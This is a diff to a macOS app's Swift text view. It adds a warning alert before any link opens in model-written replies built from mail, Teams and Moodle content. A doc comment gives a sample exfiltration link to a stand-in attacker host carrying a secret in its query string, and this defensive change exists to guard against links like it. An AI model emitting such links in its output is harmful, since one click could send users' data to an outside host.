@@ -445,6 +445,10 @@ final class RoboLayoutManager: NSLayoutManager {
 final class BoxTextView: NSTextView {
     var onClick: (() -> Void)?  // a left click within `Self.slop`, not on a link, selecting nothing
     var openLink: (URL) -> Void = { NSWorkspace.shared.open($0) }
+    /// Asked before a link opens, with its full address and the words that showed it; true opens. The reply is text from mail,
+    /// Teams and Moodle that a model wrote, so `[grades](https://evil.example/?d=SECRET)` must not leave on one stray click.
+    /// The default is an alert; a test that clicks a link replaces this too, so that none shows.
+    var confirmLink: (URL, String) -> Bool = BoxTextView.askToOpen
     /// The reply is text from mail, Teams and Moodle that a model wrote, so a link in it is not trusted to name a file, a share
     /// or an app: only these schemes are opened.
     static let schemes: Set<String> = ["http", "https", "mailto"]
@@ -453,7 +457,35 @@ final class BoxTextView: NSTextView {
     override func acceptsFirstMouse(for event: NSEvent?) -> Bool { true }
 
     override func clicked(onLink link: Any, at charIndex: Int) {
-        if let url = (link as? URL) ?? (link as? String).flatMap(URL.init(string:)), let scheme = url.scheme?.lowercased(), Self.schemes.contains(scheme) { openLink(url) }
+        guard let url = (link as? URL) ?? (link as? String).flatMap(URL.init(string:)), let scheme = url.scheme?.lowercased(),
+              Self.schemes.contains(scheme) else { return }
+        if confirmLink(url, linkText(at: charIndex)) { openLink(url) }
+    }
+
+    /// The words of the link at `index` (what the reader saw); empty when there is no link there.
+    private func linkText(at index: Int) -> String {
+        guard let storage = textStorage, index >= 0, index < storage.length else { return "" }
+        var range = NSRange()
+        guard storage.attribute(.link, at: index, longestEffectiveRange: &range, in: NSRange(location: 0, length: storage.length)) != nil else { return "" }
+        return (storage.string as NSString).substring(with: range)
+    }
+
+    /// The default `confirmLink`: an alert with the full address first, then the words when they say something else. Cancel is the
+    /// default button, so a stray key opens nothing. With no running app (a test) nothing is asked and the answer is no.
+    static func askToOpen(_ url: URL, _ words: String) -> Bool {
+        guard NSApplication.shared.isRunning else { return false }
+        let address = url.absoluteString
+        let alert = NSAlert()
+        alert.alertStyle = .warning
+        alert.messageText = "Open this link?"
+        alert.informativeText = address + (words.isEmpty || words == address ? "" : "\n\nThe link text says “\(words.prefix(120))”.")
+        alert.addButton(withTitle: "Cancel")
+        alert.addButton(withTitle: "Open")
+        let front = Focus().other()  // an accessory app takes the activation to show the alert and gives it back when nothing opens
+        NSApp.activate()
+        let open = alert.runModal() == .alertSecondButtonReturn
+        if !open { Focus().handBack(to: front) }
+        return open
     }
 
     /// NSTextView tracks the whole press-drag-release inside `mouseDown`, so the release (the last event the tracking loop took)
